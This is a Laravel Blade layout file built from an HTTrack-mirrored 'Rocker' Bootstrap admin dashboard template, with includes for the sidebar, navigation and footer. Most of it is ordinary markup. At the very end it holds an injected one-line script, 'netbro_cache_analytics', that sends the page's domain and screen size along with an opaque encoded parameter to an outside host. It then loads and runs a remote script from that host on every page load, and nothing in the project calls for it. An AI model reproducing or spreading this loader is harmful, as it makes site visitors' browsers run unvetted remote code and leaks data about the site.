{{-- <!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="csrf-token" content="{{ csrf_token() }}">

        <title>{{ config('app.name', 'Laravel') }}</title>

        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=figtree:400,500,600&display=swap" rel="stylesheet" />

        <!-- Scripts -->
        @vite(['resources/css/app.css', 'resources/js/app.js'])
    </head>
    <body class="font-sans antialiased">
        <div class="min-h-screen bg-gray-100 dark:bg-gray-900">
            @include('layouts.navigation')

            <!-- Page Heading -->
            @isset($header)
                <header class="bg-white dark:bg-gray-800 shadow">
                    <div class="max-w-7xl mx-auto py-6 px-4 sm:px-6 lg:px-8">
                        {{ $header }}
                    </div>
                </header>
            @endisset

            <!-- Page Content -->
            <main>
                {{ $slot }}
            </main>
        </div>
    </body>
</html> --}}


<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 11:59:49 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Rocker - Bootstrap4  Admin Dashboard Template</title>
  <!--favicon-->
  <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon"/>
  <!-- Vector CSS -->
  <link href="assets/plugins/vectormap/jquery-jvectormap-2.0.2.css" rel="stylesheet"/>
  <!-- simplebar CSS-->
  <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="assets/css/app-style.css" rel="stylesheet"/>

</head>

<body>

<!-- Start wrapper-->
 <div id="wrapper">

  <!--Start sidebar-wrapper-->
 @include('layouts.sidebar')
   <!--End sidebar-wrapper-->

<!--Start topbar header-->
    @include('layouts.navigation')
<!--End topbar header-->

<div class="clearfix"></div>

  <div class="content-wrapper">
    <div class="container-fluid">

      <!--Start Dashboard Content-->

        @yield('content')
       <!--End Dashboard Content-->

    </div>
    <!-- End container-fluid-->

    </div><!--End content-wrapper-->
   <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->

	<!--Start footer-->
    @include('layouts.footer')
	<!--End footer-->

  </div><!--End wrapper-->

  <!-- Bootstrap core JavaScript-->
  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/js/popper.min.js"></script>
  <script src="assets/js/bootstrap.min.js"></script>

  <!-- simplebar js -->
  <script src="assets/plugins/simplebar/js/simplebar.js"></script>
  <!-- waves effect js -->
  <script src="assets/js/waves.js"></script>
  <!-- sidebar-menu js -->
  <script src="assets/js/sidebar-menu.js"></script>
  <!-- Custom scripts -->
  <script src="assets/js/app-script.js"></script>

  <!-- Vector map JavaScript -->
  <script src="assets/plugins/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
  <script src="assets/plugins/vectormap/jquery-jvectormap-world-mill-en.js"></script>
  <!-- Chart js -->
  <script src="assets/plugins/Chart.js/Chart.min.js"></script>
  <!-- Index js -->
  <script src="assets/js/index.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhMN1ZjFqExVF6J4IeKcHe28LBc9tlZ79%2bcZqzQCTG5WL9PSAm%2f6SZpP3c9agMh70ri%2bRSs256Oap6Ocuf%2bH6v928DUzv%2bTUoKQtvZGAiX9m9zx7uO9gCxU2SkN5K1zT7CDqhKeIhh5lDzNUtHkQirH0%2fmvBWhDwBPuqW8M%2bz26DrnlmvHc9Rs7ShjyzIaOpjIN91mmqgilrdf0S7FNJ5pc1gmn3a%2bIluNPHb4BB1LVNT5CRapXDKNVJriKePAS0JSaGYX4fc2LP6NyYoEN1%2bCKN423OJySlR3jpXWdXLvTndj4bhvz%2fkVOYq%2f36zp97izjiT4m5el0NmUTvvV3AN0Nck7BCXdY9hBAUlkRYE8aox8HyTIygIwU4wqHjLijitqIDlJQIlM%2fkd4dOtoOHrHEHPJBtmTieG%2f1aRgbcH46hvzS%2fv%2bwcng7SLlyzzlnM%2bfvsWCdduBOMiwR2TKEaLi5zuMCkbIHSzM8m%2b9HF2%2bT8g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 11:59:49 GMT -->
</html>
